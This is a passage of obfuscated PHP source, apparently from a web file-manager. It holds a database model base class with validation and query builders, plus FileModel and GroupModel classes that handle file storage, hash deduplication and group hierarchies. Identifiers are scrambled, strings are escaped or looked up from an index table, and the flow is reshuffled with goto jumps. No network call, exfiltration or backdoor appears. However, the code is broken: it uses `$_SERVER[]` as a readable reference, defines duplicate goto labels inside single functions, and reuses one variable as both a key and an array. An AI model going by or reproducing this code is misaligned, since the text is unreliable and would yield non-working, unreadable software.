(isset($this->options[$dߞմՙ[299]]) && !$this->options[$dߞմՙ[299]]) { return !0; } if (think_config($dߞմՙ[296])) { $A䮂ҏ = think_config($dߞմՙ[297]); if (!isset($a⨌[$A䮂ҏ]) || Session::get($A䮂ҏ)) { return !1; } list($cݬƊ, $Aђ) = explode($dߞմՙ[71], $a⨌[$A䮂ҏ]); if ($Aђ && Session::get($A䮂ҏ . $dߞմՙ[95] . $cݬƊ) === $Aђ) { Session::remove($A䮂ҏ . $dߞմՙ[95] . $cݬƊ); return !0; } if (think_config($dߞմՙ[300])) { Session::remove($A䮂ҏ . $dߞմՙ[95] . $cݬƊ); } return !1; } return !0; } public function regex($Dܟ, $eЈΡ) { $e½Ǌ =& $_SERVER[]; $cߜ䚼 = array($e½Ǌ[301] => $e½Ǌ[302], $e½Ǌ[303] => $e½Ǌ[304], $e½Ǌ[305] => $e½Ǌ[306], $e½Ǌ[307] => $e½Ǌ[308], $e½Ǌ[309] => $e½Ǌ[310], $e½Ǌ[311] => $e½Ǌ[312], $e½Ǌ[313] => $e½Ǌ[314], $e½Ǌ[288] => $e½Ǌ[315], $e½Ǌ[316] => $e½Ǌ[317]); if (isset($cߜ䚼[strtolower($eЈΡ)])) { $eЈΡ = $cߜ䚼[strtolower($eЈΡ)]; } return preg_match($eЈΡ, $Dܟ) === 1; } private function autoOperation(&$Fɾ, $C񶜑) { $E =& $_SERVER[]; if (!empty($this->options[$E[318]])) { $d = $this->options[$E[318]]; unset($this->options[$E[318]]); } elseif (!empty($this->_auto)) { $d = $this->_auto; } if (isset($d)) { foreach ($d as $f) { if (empty($f[2])) { $f[2] = THINK_MODEL_INSERT; } if ($C񶜑 == $f[2] || $f[2] == THINK_MODEL_BOTH) { switch (trim($f[3])) { case $E[319]: case $E[320]: $DČ = isset($f[4]) ? (array) $f[4] : array(); if (isset($Fɾ[$f[0]])) { array_unshift($DČ, $Fɾ[$f[0]]); } if ($E[319] == $f[3]) { $Fɾ[$f[0]] = call_user_func_array($f[1], $DČ); } else { $Fɾ[$f[0]] = call_user_func_array(array(&$this, $f[1]), $DČ); } break; case $E[271]: $Fɾ[$f[0]] = $Fɾ[$f[1]]; break; case $E[321]: if ($E[33] === $Fɾ[$f[0]]) { unset($Fɾ[$f[0]]); } break; case $E[322]: default: $Fɾ[$f[0]] = $f[1]; } if (!1 === $Fɾ[$f[0]]) { unset($Fɾ[$f[0]]); } } } } return $Fɾ; } protected function autoValidation($f, $C̏ȗ) { $bލ =& $_SERVER[]; if (!empty($this->options[$bލ[323]])) { $fΐ = $this->options[$bލ[323]]; unset($this->options[$bލ[323]]); } elseif (!empty($this->_validate)) { $fΐ = $this->_validate; } if (isset($fΐ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($fΐ as $A => $Bⷷ) { if (empty($Bⷷ[5]) || $Bⷷ[5] == THINK_MODEL_BOTH || $Bⷷ[5] == $C̏ȗ) { if (0 == strpos($Bⷷ[2], $bލ[324]) && strpos($Bⷷ[2], $bލ[325])) { $Bⷷ[2] = think_lang(substr($Bⷷ[2], 2, -1)); } $Bⷷ[3] = isset($Bⷷ[3]) ? $Bⷷ[3] : THINK_EXISTS_VALIDATE; $Bⷷ[4] = isset($Bⷷ[4]) ? $Bⷷ[4] : $bލ[326]; switch ($Bⷷ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($f, $Bⷷ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($bލ[33] != trim($f[$Bⷷ[0]])) { if (!1 === $this->_validationField($f, $Bⷷ)) { return !1; } } break; default: if (isset($f[$Bⷷ[0]])) { if (!1 === $this->_validationField($f, $Bⷷ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($e׏, $A⏤) { if (!1 === $this->_validationFieldItem($e׏, $A⏤)) { if ($this->patchValidate) { $this->error[$A⏤[0]] = $A⏤[2]; } else { $this->error = $A⏤[2]; return !1; } } return; } protected function _validationFieldItem($E߫, $eӸۭɢ) { $c賮 =& $_SERVER[]; switch (strtolower(trim($eӸۭɢ[4]))) { case $c賮[319]: case $c賮[320]: $A = isset($eӸۭɢ[6]) ? (array) $eӸۭɢ[6] : array(); if (is_string($eӸۭɢ[0]) && strpos($eӸۭɢ[0], $c賮[47])) { $eӸۭɢ[0] = explode($c賮[47], $eӸۭɢ[0]); } if (is_array($eӸۭɢ[0])) { foreach ($eӸۭɢ[0] as $b؂) { $d϶[$b؂] = $E߫[$b؂]; } array_unshift($A, $d϶); } else { array_unshift($A, $E߫[$eӸۭɢ[0]]); } if ($c賮[319] == $eӸۭɢ[4]) { return call_user_func_array($eӸۭɢ[1], $A); } else { return call_user_func_array(array(&$this, $eӸۭɢ[1]), $A); } case $c賮[327]: return $E߫[$eӸۭɢ[0]] == $E߫[$eӸۭɢ[1]]; case $c賮[328]: if (is_string($eӸۭɢ[0]) && strpos($eӸۭɢ[0], $c賮[47])) { $eӸۭɢ[0] = explode($c賮[47], $eӸۭɢ[0]); } $C = array(); if (is_array($eӸۭɢ[0])) { foreach ($eӸۭɢ[0] as $b؂) { $C[$b؂] = $E߫[$b؂]; } } else { $C[$eӸۭɢ[0]] = $E߫[$eӸۭɢ[0]]; } if (!empty($E߫[$this->getPk()])) { $C[$this->getPk()] = array($c賮[329], $E߫[$this->getPk()]); } if ($this->where($C)->find()) { return !1; } return !0; default: return $this->check($E߫[$eӸۭɢ[0]], $eӸۭɢ[1], $eӸۭɢ[4]); } } public function check($Aϰ, $d, $BշС = "\x72\x65\147\x65\x78") { $Bƈ =& $_SERVER[]; $BշС = strtolower(trim($BշС)); switch ($BշС) { case $Bƈ[7]: case $Bƈ[330]: $Bֵ = is_array($d) ? $d : explode($Bƈ[47], $d); return $BշС == $Bƈ[7] ? in_array($Aϰ, $Bֵ) : !in_array($Aϰ, $Bֵ); case $Bƈ[331]: case $Bƈ[332]: if (is_array($d)) { $bጉ = $d[0]; $DĶ = $d[1]; } else { list($bጉ, $DĶ) = explode($Bƈ[47], $d); } return $BշС == $Bƈ[331] ? $Aϰ >= $bጉ && $Aϰ <= $DĶ : $Aϰ < $bጉ || $Aϰ > $DĶ; case $Bƈ[333]: case $Bƈ[334]: return $BշС == $Bƈ[333] ? $Aϰ == $d : $Aϰ != $d; case $Bƈ[335]: $dι = mb_strlen($Aϰ, $Bƈ[336]); if (strpos($d, $Bƈ[47])) { list($bጉ, $DĶ) = explode($Bƈ[47], $d); return $dι >= $bጉ && $dι <= $DĶ; } else { return $dι == $d; } case $Bƈ[337]: list($Eڽ, $f) = explode($Bƈ[47], $d); if (!is_numeric($Eڽ)) { $Eڽ = strtotime($Eڽ); } if (!is_numeric($f)) { $f = strtotime($f); } return NOW_TIME >= $Eڽ && NOW_TIME <= $f; case $Bƈ[338]: return in_array(get_client_ip(), explode($Bƈ[47], $d)); case $Bƈ[339]: return !in_array(get_client_ip(), explode($Bƈ[47], $d)); case $Bƈ[326]: default: return $this->regex($Aϰ, $d); } } public function query($a״ق, $a = false) { $aˎ܇ÿ =& $_SERVER[]; if (!is_bool($a) && !is_array($a)) { $a = func_get_args(); array_shift($a); } $a״ق = str_replace(array($aˎ܇ÿ[229], $aˎ܇ÿ[340]), $aˎ܇ÿ[50], $a״ق); $a״ق = $this->parseSql($a״ق, $a); return $this->db->query($a״ق); } public function execute($aߠ, $d̒ = false) { if (!is_bool($d̒) && !is_array($d̒)) { $d̒ = func_get_args(); array_shift($d̒); } $aߠ = $this->parseSql($aߠ, $d̒); return $this->db->execute($aߠ); } protected function parseSql($A, $C닷ᒞ) { $Dւ =& $_SERVER[]; if (!0 === $C닷ᒞ) { $Fڱ = $this->_parseOptions(); $A = $this->db->parseSql($A, $Fڱ); } elseif (is_array($C닷ᒞ)) { $C닷ᒞ = array_map(array($this->db, $Dւ[341]), $C닷ᒞ); $A = vsprintf($A, $C닷ᒞ); } else { $A = strtr($A, array($Dւ[342] => $this->getTableName(), $Dւ[343] => think_config($Dւ[242]))); } $this->db->setModel($this->name); return $A; } public function db($D = '', $f挒 = '', $c͊ҝ = array()) { goto FՇ; FՇ: $F =& $_SERVER[]; if ($F[33] === $D && $this->db) { return $this->db; } static $B˃ = array(); goto CȨږ; d֭: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto E; E: $B˃[$D] = $f挒; $this->db = $D[$D]; $this->_after_db(); goto d֭; CȨږ: static $D = array(); if (!isset($D[$D]) || isset($D[$D]) && $f挒 && $B˃[$D] != $f挒) { if (!empty($f挒) && is_string($f挒) && !1 === strpos($f挒, $F[8])) { $f挒 = think_config($f挒); } $D[$D] = Db::getInstance($f挒); } elseif (NULL === $f挒) { $D[$D]->close(); unset($D[$D]); return; } if (!empty($c͊ҝ)) { if (is_string($c͊ҝ)) { parse_str($c͊ҝ, $c͊ҝ); } foreach ($c͊ҝ as $Fɦ܏ => $AѾ) { $this->setProperty($Fɦ܏, $AѾ); } } goto E; E: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $FÄ = get_class($this); if ($FÄ == $_SERVER[][344]) { return $this->name; } $this->name = substr($FÄ, 0, -5); } return $this->name; } public function getTableName() { $bê =& $_SERVER[]; if (empty($this->trueTableName)) { $BϦ = !empty($this->tablePrefix) ? $this->tablePrefix : $bê[33]; if (!empty($this->tableName)) { $BϦ .= $this->tableName; } else { $BϦ .= think_parse_name($this->name); } $this->trueTableName = strtolower($BϦ); } return (!empty($this->dbName) ? $this->dbName . $bê[95] : $bê[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $bǻէ =& $_SERVER[]; return isset($this->fields[$bǻէ[249]]) ? $this->fields[$bǻէ[249]] : $this->pk; } public function getDbFields() { $c֠ =& $_SERVER[]; if (isset($this->options[$c֠[277]])) { $C = $this->db->getFields($this->options[$c֠[277]]); return $C ? array_keys($C) : !1; } if ($this->fields) { $C = $this->fields; unset($C[$c֠[248]], $C[$c֠[249]], $C[$c֠[250]], $C[$c֠[247]]); return $C; } return !1; } public function data($fܵ֜ = '') { $e򘍰 =& $_SERVER[]; if ($e򘍰[33] === $fܵ֜ && !empty($this->data)) { return $this->data; } if (is_object($fܵ֜)) { $fܵ֜ = get_object_vars($fܵ֜); } elseif (is_string($fܵ֜)) { parse_str($fܵ֜, $fܵ֜); } elseif (!is_array($fܵ֜)) { think_exception(think_lang($e򘍰[269])); } $this->data = $fܵ֜; return $this; } public function join($fƬ) { $EȽĄ =& $_SERVER[]; if (is_array($fƬ)) { $this->options[$EȽĄ[280]] = $fƬ; } elseif (!empty($fƬ)) { $this->options[$EȽĄ[280]][] = $fƬ; } return $this; } public function union($Aؓ, $dڌ = false) { goto Dȧ; E: if (is_object($Aؓ)) { $Aؓ = get_object_vars($Aؓ); } if (is_string($Aؓ)) { $E儇 = $Aؓ; } elseif (is_array($Aؓ)) { if (isset($Aؓ[0])) { $this->options[$cٴ[345]] = array_merge($this->options[$cٴ[345]], $Aؓ); return $this; } else { $E儇 = $Aؓ; } } else { think_exception(think_lang($cٴ[269])); } $this->options[$cٴ[345]][] = $E儇; goto f; Dȧ: $cٴ =& $_SERVER[]; if (empty($Aؓ)) { return $this; } if ($dڌ) { $this->options[$cٴ[345]][$cٴ[346]] = !0; } goto E; f: return $this; goto e카; e카: } public function cache($Cם = true, $Cܹ = null, $eͲ = '') { $F鏨Ѱ =& $_SERVER[]; if (!1 !== $Cם) { $this->options[$F鏨Ѱ[347]] = array($F鏨Ѱ[93] => $Cם, $F鏨Ѱ[337] => $Cܹ, $F鏨Ѱ[29] => $eͲ); } return $this; } public function field($A, $Eٍ҈ = false) { $eք =& $_SERVER[]; if (!0 === $A) { $E = $this->getDbFields(); $A = $E ? $E : $eք[182]; } elseif ($Eٍ҈) { if (is_string($A)) { $A = explode($eք[47], $A); } $E = $this->getDbFields(); $A = $E ? array_diff($E, $A) : $A; } $this->options[$eք[271]] = $A; return $this; } public function scope($F܂ࣰÎ = '', $Aڌ = NULL) { $Fڇ =& $_SERVER[]; if ($Fڇ[33] === $F܂ࣰÎ) { if (isset($this->_scope[$Fڇ[34]])) { $DԔ = $this->_scope[$Fڇ[34]]; } else { return $this; } } elseif (is_string($F܂ࣰÎ)) { $c = explode($Fڇ[47], $F܂ࣰÎ); $DԔ = array(); foreach ($c as $dǃĞ) { if (!isset($this->_scope[$dǃĞ])) { continue; } $DԔ = array_merge($DԔ, $this->_scope[$dǃĞ]); } if (!empty($Aڌ) && is_array($Aڌ)) { $DԔ = array_merge($DԔ, $Aڌ); } } elseif (is_array($F܂ࣰÎ)) { $DԔ = $F܂ࣰÎ; } if (is_array($DԔ) && !empty($DԔ)) { $this->options = array_merge($this->options, array_change_key_case($DԔ)); } return $this; } public function where($Dݍ, $EɃ = null) { $E =& $_SERVER[]; if (!is_null($EɃ) && is_string($Dݍ)) { if (!is_array($EɃ)) { $EɃ = func_get_args(); array_shift($EɃ); } $EɃ = array_map(array($this->db, $E[341]), $EɃ); $Dݍ = vsprintf($Dݍ, $EɃ); } elseif (is_object($Dݍ)) { $Dݍ = get_object_vars($Dݍ); } elseif (is_array($Dݍ)) { foreach ($Dݍ as $Fɢ => $aṳ) { if ((is_numeric($Fɢ) || !$Fɢ) && is_string($aṳ)) { if (strpos($aṳ, $E[348]) === 0) { continue; } think_trace($E[349], $E[33], $E[46]); die; } } } if (is_string($Dݍ) && $E[33] != $Dݍ) { $CȈ = array(); $CȈ[$E[350]] = $Dݍ; $Dݍ = $CȈ; } if (isset($this->options[$E[273]])) { $this->options[$E[273]] = array_merge($this->options[$E[273]], $Dݍ); } else { $this->options[$E[273]] = $Dݍ; } return $this; } public function limit($ḟι, $b = null) { $Aۺ݅ =& $_SERVER[]; $this->options[$Aۺ݅[290]] = is_null($b) ? $ḟι : $ḟι . $Aۺ݅[47] . $b; return $this; } public function page($Dǳ˙, $eؐ = null) { $cڅ =& $_SERVER[]; $this->options[$cڅ[351]] = is_null($eؐ) ? $Dǳ˙ : $Dǳ˙ . $cڅ[47] . $eؐ; return $this; } public function comment($bݖ) { $this->options[$_SERVER[][352]] = $bݖ; return $this; } public function setProperty($EɌ, $b񱷱) { if (property_exists($this, $EɌ)) { $this->{$EɌ} = $b񱷱; } return $this; } } goto e; B򺥂: class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\x69\x6c\x65\137\x63\x6f\156\164\x65\x6e\x74\x73"; protected $dataAuto = array(array("\x63\x72\x65\141\164\x65\124\151\x6d\x65", "\x74\x69\x6d\x65", "\151\156\x73\x65\x72\x74", "\146\x75\x6e\x63\x74\151\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\151\154\145"; protected $tableMeta = array("\164\x61\142\x6c\145\x4e\141\155\x65" => "\x69\157\x5f\x66\151\x6c\x65\x5f\155\145\x74\x61", "\155\145\164\141\x46\x69\145\x6c\144" => "\x66\x69\154\x65\x49\x44"); public function fileInfo($aފ) { $Cޔ =& $_SERVER[]; static $cʹ = array(); if (!isset($cʹ[$aފ])) { $A = $Cޔ[1763]; $b = Model($Cޔ[464])->field($A)->where(array($Cޔ[462] => $aފ))->find(); $cʹ[$aފ] = $b; } return $cʹ[$aފ]; } public function addFileByContent($b֤ʵ = '', $Cێѿ = '') { goto Eǲݔ; B璤: $DÊ = $E . $a[1765] . rand_string(16); file_put_contents($DÊ, $b֤ʵ); $B׮ = $this->addFile($DÊ, $Cێѿ, !0); goto CΗß; Eǲݔ: $a =& $_SERVER[]; $E = TEMP_PATH . $a[1764]; if (!is_dir($E)) { mk_dir($E); } goto B璤; CΗß: if (file_exists($DÊ)) { @unlink($DÊ); } return $B׮; goto d΍; d΍: } public function createFileName($F, $c萮ѕ = false, $cԳ = false) { goto D; D: $e뙑մ =& $_SERVER[]; $EՅ = IO::init($e뙑մ[8]); $Dɴ = $this->makeFilePath($F, $EՅ, $c萮ѕ, $cԳ); goto d؊; d؊: $f߄ = $EՅ->pathFather($Dɴ); static $D = false; $E򂋓 = $e뙑մ[1766] . md5($f߄); goto D; D: if (!$D && !Cache::get($E򂋓)) { $D = !0; $a̳ = IO::mkdir($f߄); if (!IO::exist($a̳ . $e뙑մ[780])) { IO::mkfile($a̳ . $e뙑մ[780]); } Cache::set($E򂋓, 1, 3600 * 2); } return $Dɴ; goto a; a: } public function makeFilePath($Bȼׇԇ, $aΆ, $B = false, $FԶ = false) { goto dȓ; dȓ: $E =& $_SERVER[]; $f혤Շ = Model($E[747])->get($E[1767]); $BȲ¢ = KodIO::defaultIO() . date($E[1768]); goto Cܺ; c: if (!$Bȼׇԇ) { $f혤Շ = $E[1769]; } switch ($f혤Շ) { case $E[1770]: $a٩ = $a٩ . $E[95] . $aΆ->ext($Bȼׇԇ); if ($c == $E[1705]) { $a٩ .= $E[1445]; } break; case $E[1771]: goto Â; fƆǴ: $BȲ¢ = $E[1141] . $aԨ[$E[395]] . $E[404] . date($E[1772]) . $e㥣̆ . $E[8]; if ($c == $E[1705]) { $Bȼׇԇ .= $E[1445]; } $bê = $E[1773] . $BȲ¢ . $Bȼׇԇ; goto bެʄ; Â: $e덭 = Model($E[747])->get($E[748]); $e㥣̆ = substr(md5($E[749] . $e덭 . date($E[725])), 0, 8); $aԨ = KodIO::defaultDriver(); goto fƆǴ; bެʄ: CacheLock::lock($bê); $a٩ = $BȲ¢ . $Bȼׇԇ; if (IO::exist($BȲ¢ . $Bȼׇԇ)) { $Fڇ = substr($Bȼׇԇ, 0, strlen($Bȼׇԇ) - strlen($c)); $A = $FԶ ? substr($FԶ, 0, 5) : ($B ? substr($B, 0, 5) : rand_string(5)); $a٩ = $BȲ¢ . $Fڇ . $A . $E[95] . $c; } goto b; b: if (IO::isTypeObject($a٩) && !IO::isUploadServer($a٩)) { if (IO::exist($a٩)) { return $a٩; } $Bߟ = IO::setContent($a٩, $E[33]); if (!$Bߟ) { show_json($E[1774], !1); } } CacheLock::unlock($bê); break; goto aڶ; aڶ: case $E[1769]: break; default: break; } return $a٩; goto Bӓ; Cܺ: $a٩ = $BȲ¢ . rand_string(5) . short_id(100); $Bȼׇԇ = str_replace($E[8], $E[71], KodIO::clear($Bȼׇԇ)); $c = $aΆ->ext($Bȼׇԇ); goto c; Bӓ: } public function addFileByRemote($b, $Fؕ, $Fݏ٢ = array()) { goto Dձ; Dձ: $E𸫧 =& $_SERVER[]; if (!IO::exist($b)) { return !1; } $F֭׶ = $Fݏ٢[$E𸫧[170]] ? $Fݏ٢[$E𸫧[170]] : $E𸫧[33]; goto cɯ; cɯ: $Fǝ = IO::hashMd5($b, $F֭׶); $dμ䇹 = KodIO::defaultDriver(); $E = array($E𸫧[573] => IO::size($b), $E𸫧[1775] => 1, $E𸫧[415] => $Fؕ, $E𸫧[792] => $dμ䇹[$E𸫧[395]], $E𸫧[416] => $b, $E𸫧[1776] => $Fݏ٢[$E𸫧[171]] ? $Fݏ٢[$E𸫧[171]] : IO::hashSimple($b), $E𸫧[1777] => $Fǝ ? $Fǝ : $F֭׶); goto bוγ; bוγ: if ($fָڊ = $this->addFileCheckExist($E[$E𸫧[171]], $E[$E𸫧[170]], $E[$E𸫧[78]])) { return $fָڊ; } return $this->addFileData($E); goto F; F: } private function addFileData($eͨ) { $Dǋ =& $_SERVER[]; if (!$eͨ) { return !1; } $eͨ[$Dǋ[78]] = intval($eͨ[$Dǋ[78]]); if (!$eͨ[$Dǋ[78]] && strlen($eͨ[$Dǋ[171]]) > 32) { $eͨ[$Dǋ[78]] = intval(substr($eͨ[$Dǋ[171]], 32)); } $e = $this->add($eͨ); return $this->find($e); } public function addFile($Eʣ, $EᏜ, $F턣 = false) { goto bϬĄ; Bį̏: return $Fά; goto Bå; a󻔙: $Dʏԯ = $_SERVER[][1778] . $f笼; CacheLock::lock($Dʏԯ); if ($aڅ = $this->addFileCheckExist($AׅҎ, $f笼, $dĐݣ)) { CacheLock::unlock($Dʏԯ); return $aڅ; } goto B盺; B盺: $DҘ = $this->addFileMake($Eʣ, $dĐݣ, $AׅҎ, $f笼, $EᏜ, $F턣); $Fά = $this->addFileData($DҘ); CacheLock::unlock($Dʏԯ); goto Bį̏; bϬĄ: $AׅҎ = IO::hashSimple($Eʣ); $f笼 = IO::hashMd5($Eʣ); $dĐݣ = IO::size($Eʣ); goto a󻔙; Bå: } public function addFileMake($A˫, $aɣ, $F֍, $bȅ, $Bζ, $dȄ) { goto dԞ; dԞ: $FÉ¹ =& $_SERVER[]; $f۽ = $this->createFileName($Bζ, $F֍, $bȅ); $a݌ = get_path_father($f۽); goto F矔; D܏̥: $FɂŖ = KodIO::defaultDriver(); $e܊ = array($FÉ¹[573] => $aɣ, $FÉ¹[1775] => 1, $FÉ¹[415] => $Bζ, $FÉ¹[792] => $FɂŖ[$FÉ¹[395]], $FÉ¹[416] => $f۽, $FÉ¹[1776] => $F֍, $FÉ¹[1777] => $bȅ); return $e܊; goto a寊Ҿ; F矔: $c = get_path_this($f۽); if ($dȄ) { $Bʐ = IO::move($A˫, $a݌, !1, $c); } else { $Bʐ = IO::copy($A˫, $a݌, !1, $c); } if (!$Bʐ) { return !1; } goto D܏̥; a寊Ҿ: } public function addFileCheckExist($F, $a؃, $C감) { $b욇 =& $_SERVER[]; $d = $this->findByHash($F, $a؃); if (!$d) { return !1; } $aͣ = array($b욇[1775] => intval($d[$b욇[1779]]) + 1, $b욇[573] => $C감); $this->where(array($b욇[462] => $d[$b욇[461]]))->save($aͣ); return $d; } public function remove($E塻ٵ) { $this->linkCountChange($E塻ٵ, !1); $this->clearEmpty(); return !0; } public function linkAdd($d܄¥) { $this->linkCountChange($d܄¥, !0); } public function linkCountChange($F, $aǏ͑) { goto f֕; f֕: $C՞ =& $_SERVER[]; if (!$F) { return; } if (!is_array($F)) { $F = array($F); } goto dŹՐ; d̊: foreach ($eŮ as $e => $e̳ĕ) { $Cߪ = $e̳ĕ . $C՞[33]; if (!$b法[$Cߪ]) { $b法[$Cߪ] = array(); } $b法[$Cߪ][] = $e; } foreach ($b法 as $e̳ĕ => $Aԍ) { if (!$Aԍ) { continue; } $e̳ĕ = $aǏ͑ ? $e̳ĕ : -intval($e̳ĕ); $Dͦ = array($C՞[461] => array($C՞[7], $Aԍ)); if ($e̳ĕ < 0) { $Dͦ[$C՞[1779]] = array($C՞[991], abs($e̳ĕ)); } $this->where($Dͦ)->setAdd($C՞[1779], $e̳ĕ); } goto a; dŹՐ: $eŮ = array(); foreach ($F as $e) { $Cߪ = $e . $C՞[33]; if (!$eŮ[$Cߪ]) { $eŮ[$Cߪ] = 0; } $eŮ[$Cߪ]++; } $b法 = array(); goto d̊; a: } public function findByHash($a׆Ԍ, $C = false) { $A홍Ό =& $_SERVER[]; if (!$a׆Ԍ && !$C) { return !1; } $b̃ = array($A홍Ό[1776] => $a׆Ԍ); if ($C) { $b̃ = array($A홍Ό[1777] => $C); } return $this->order($A홍Ό[1780])->where($b̃)->find(); } public function clearEmpty($Dƕ = 0) { goto AՑ; cÂ: foreach ($bݎć as $e) { $dɧ->update(1); $this->resetFile($e); } $dɧ->end(); goto dɠ; AՑ: $Cي =& $_SERVER[]; $B = time() - 3600 * 24 * $Dƕ; $d = $Cي[1781] . $B; goto B; B: $bݎć = $this->where($d)->select(); if (!$bݎć) { return; } $dɧ = new Task($Cي[1782], $Cي[33], count($bݎć)); goto cÂ; dɠ: } public function resetFile($b) { goto Eѝ; dΤ: $eЍ = Model($c輟[1783])->where($Aى)->count(); $Eȩ = intval($eܪ) + intval($eЍ); if ($Eȩ == 0) { IO::remove($b[$c輟[76]]); Model($c輟[1784])->delete($b[$c輟[461]]); $this->where($Aى)->delete(); $this->metaSet($b[$c輟[461]], null, null); return; } goto Dʹٲ; Eѝ: $c輟 =& $_SERVER[]; $Aى = array($c輟[462] => $b[$c輟[461]]); $eܪ = Model($c輟[1223])->where($Aى)->count(); goto dΤ; Dʹٲ: if ($b[$c輟[1779]] != $Eȩ) { $this->where($Aى)->save(array($c輟[1775] => $Eȩ)); } goto Fآꋮ; Fآꋮ: } public function storageInfo($A♂ = false) { goto bד; Bڢ߲: $cá = 1; $A쌄Ә = 0; $Cڄ = 5000; goto Eæ; bד: $dɴ =& $_SERVER[]; $b = $this->count() + 0.0; $EŎ = 0; goto Bڢ߲; Eæ: for ($aݲ = 0; $aݲ < $b; $aݲ = $aݲ + $Cڄ) { $AƑ = $this->limit($aݲ, $aݲ + $Cڄ)->select(); foreach ($AƑ as $D݌) { $cá += $D݌[$dɴ[78]] * $D݌[$dɴ[1779]]; $EŎ += $D݌[$dɴ[78]] * ($D݌[$dɴ[1779]] - 1); $A쌄Ә += $D݌[$dɴ[1779]]; } } $Dה = array($dɴ[1785] => $cá, $dɴ[1786] => $EŎ, $dɴ[1787] => $EŎ / $cá, $dɴ[82] => $b, $dɴ[1788] => $A쌄Ә); return $Dה; goto dݵ; dݵ: } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\x75\160"; protected $tableMeta = array("\164\141\x62\154\145\x4e\141\x6d\x65" => "\147\162\157\x75\x70\x5f\155\x65\164\141", "\155\145\x74\x61\x46\x69\145\154\x64" => "\147\162\157\x75\x70\x49\x44"); protected function cacheFunctionAlias($d) { $D =& $_SERVER[]; return array($D[1789] => array($d[0], $D[1790]), $D[1791] => array($d[0], $D[1792])); } protected function getInfo($Ā, $Fڃʮ = false) { $a׊ = $this->getInfoSimple($Ā); if (!$a׊) { return !1; } if ($Fڃʮ) { return $this->_listDataApplyItem($a׊); } return $this->cacheFunctionGet($_SERVER[][1793], $Ā); } protected function getInfoSimple($D㡚, $EǱ뿍 = false) { $Eϊ޶ض =& $_SERVER[]; if ($EǱ뿍) { $bӄʊ = array($Eϊ޶ض[1715] => intval($D㡚)); $C = $this->where($bӄʊ)->find(); return is_array($C) ? $C : array(); } return $this->cacheFunctionGet($Eϊ޶ض[1794], $D㡚); } protected function groupAdd($Cӟ) { goto F肹; F肹: $a =& $_SERVER[]; if (!$Cӟ[$a[492]] && isset($Cӟ[$a[1715]]) && $Cӟ[$a[1715]] == 1) { if ($cזӬ = $this->getInfoSimple($Cӟ[$a[1715]], !0)) { return $Cӟ[$a[1715]]; } } else { $cזӬ = $this->getInfoSimple($Cӟ[$a[492]]); if (!$cזӬ) { return !1; } } $f슆 = $a[525]; goto fƃĹ; B톅͖: if (isset($Cӟ[$a[1797]])) { $this->metaSet($B誑, array($a[1797] => $Cӟ[$a[1797]], $a[1798] => $Cӟ[$a[1798]])); unset($Cӟ[$a[1797]]); unset($Cӟ[$a[1798]]); } Model($a[1223])->groupRootAdd($B誑); return $B誑; goto DɌ; f烟: if (!empty($Cӟ[$a[1715]])) { $f[$a[1715]] = $Cӟ[$a[1715]]; } $B誑 = $this->add($f); $this->setNamePinyin($B誑, $f[$a[28]]); goto B톅͖; fƃĹ: if ($cזӬ[$a[515]]) { $f슆 = $cזӬ[$a[515]] . $cזӬ[$a[1715]] . $a[47]; } $f = array($a[415] => $this->groupNameAuto($Cӟ[$a[492]], $Cӟ[$a[28]]), $a[396] => $Cӟ[$a[492]], $a[578] => $f슆, $a[1795] => $Cӟ[$a[1699]], $a[1796] => 0, $a[1719] => 0); if (isset($Cӟ[$a[1738]])) { $f[$a[1738]] = $Cӟ[$a[1738]]; } else { $c = $this->max($a[1738]); if (!$c) { $c = 0; } $f[$a[1738]] = $c + 1; } goto f烟; DɌ: } protected function groupEdit($b, $Cݽ) { goto eߞ; B䭡: if (!empty($Cݽ[$f̌ز[492]])) { $EҸ = $this->getInfoSimple($Cݽ[$f̌ز[492]]); if (!$EҸ) { return !1; } if ($e蜔[$f̌ز[1715]] == $EҸ[$f̌ز[1715]]) { return !1; } if ($Cݽ[$f̌ز[492]] != $e蜔[$f̌ز[492]]) { if ($EҸ[$f̌ز[515]] !== $e蜔[$f̌ز[515]] && strpos($EҸ[$f̌ز[515]], $e蜔[$f̌ز[515]] . $e蜔[$f̌ز[1715]] . $f̌ز[47]) === 0) { return !1; } $Cݽ[$f̌ز[578]] = $EҸ[$f̌ز[515]] . $Cݽ[$f̌ز[492]] . $f̌ز[47]; $this->_changeChildLevel($e蜔, $EҸ); } } if (isset($Cݽ[$f̌ز[28]])) { $this->setNamePinyin($b, $Cݽ[$f̌ز[28]]); } if (isset($Cݽ[$f̌ز[1797]])) { $this->metaSet($b, array($f̌ز[1797] => $Cݽ[$f̌ز[1797]], $f̌ز[1798] => $Cݽ[$f̌ز[1798]])); unset($Cݽ[$f̌ز[1797]]); unset($Cݽ[$f̌ز[1798]]); } goto A; A: $this->_clearChildrenCache($e蜔); return $this->where(array($f̌ز[1799] => $b))->save($Cݽ); goto c; eߞ: $f̌ز =& $_SERVER[]; $e蜔 = $this->getInfoSimple($b); if (!$e蜔) { return !1; } goto B䭡; c: } private function _clearChildrenCache($Aĉ) { $bۑ =& $_SERVER[]; $eϺ = array($bۑ[578] => array($bۑ[538], $Aĉ[$bۑ[515]] . $Aĉ[$bۑ[1715]] . $bۑ[539])); $fȼ = $this->field($bۑ[1715])->where($eϺ)->select(); foreach ($fȼ as $F) { $this->_clearCache($F[$bۑ[1715]]); } } private function _clearCache($D) { $D =& $_SERVER[]; $this->cacheFunctionClear($D[1793], $D); $this->cacheFunctionClear($D[1794], $D); } private function _changeChildLevel($dﳅ, $cח, $F = false) { goto a໒; c: $this->_clearChildrenCache($dﳅ); $this->where($Fҫҧ)->data($c)->save(); goto Dԉ; C׌: if ($F) { $bՈ = 